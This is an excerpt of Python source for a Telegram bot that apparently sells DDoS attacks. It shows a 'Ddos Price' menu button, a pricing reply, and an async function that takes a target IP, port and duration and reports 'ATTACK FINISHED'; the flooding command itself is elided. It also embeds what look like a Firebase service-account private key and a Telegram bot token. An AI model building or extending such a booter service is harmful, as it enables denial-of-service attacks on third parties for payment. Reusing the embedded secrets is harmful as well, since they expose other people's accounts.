...
firebase_credentials = {
  ...
  "project_id": "user-keys-1154e",
  "private_key_id": "2af069409e81325e45491cf81df409066e8d26cd",
  "private_key": "-----BEGIN PRIVATE KEY-----\\nA34PjRNc01lUjBJf8yVfjPE4\n-----END PRIVATE KEY-----\n",
  "client_email": "firebase-adminsdk-4vvnv@user-keys-1154e.iam.gserviceaccount.com",
  "client_id": "104905757950702557078",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-4vvnv%40user-keys-1154e.iam.gserviceaccount.com",
...
bot_token = '8186143877:AAGL1ilMSB4kmsRGih2h_pkdRcdIyZl97C4'  # Replace with your bot token
...
ADMIN_ID = 5616232839 # Replace with the actual admin's user ID
...
def handle_start(message):
    ...
    markup.add(
        ...
        telebot.types.KeyboardButton("🚀 Ddos Price"),
...
# Define the async function for running the attack command
async def run_attack_command_async(target_ip, target_port, duration):
    ...
    try:
        ...
        bot.send_message(ADMIN_USER_ID, f"🚀⚡ ATTACK FINISHED⚡🚀")
    except Exception as e:
...
def handle_contact_admin(message):
    bot.reply_to(message, """🌀DDOS PRICE 
